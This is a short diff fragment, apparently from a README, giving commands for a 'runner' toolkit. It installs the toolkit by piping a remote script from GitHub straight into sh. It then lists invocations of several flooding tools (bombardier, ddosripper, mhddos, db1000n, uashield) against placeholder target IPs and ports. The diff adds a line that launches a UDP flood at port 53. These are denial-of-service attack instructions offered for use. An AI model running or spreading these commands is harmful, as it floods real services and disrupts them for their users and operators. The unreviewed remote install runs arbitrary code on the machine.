@@ -19,7 +19,8 @@ curl https://raw.githubusercontent.com/ctukraine22/runner/master/install.sh | sh
 
 ```
 /runner/run.sh bombardier x.x.x.x 80 
-/runner/run.sh ddosripper x.x.x.x 443 
+/runner/run.sh ddosripper x.x.x.x 443
+bash /runner/run.sh mhddos UDP x.x.x.x:53 100 3000
 /runner/run.sh db1000n
 /runner/run.sh uashield
 
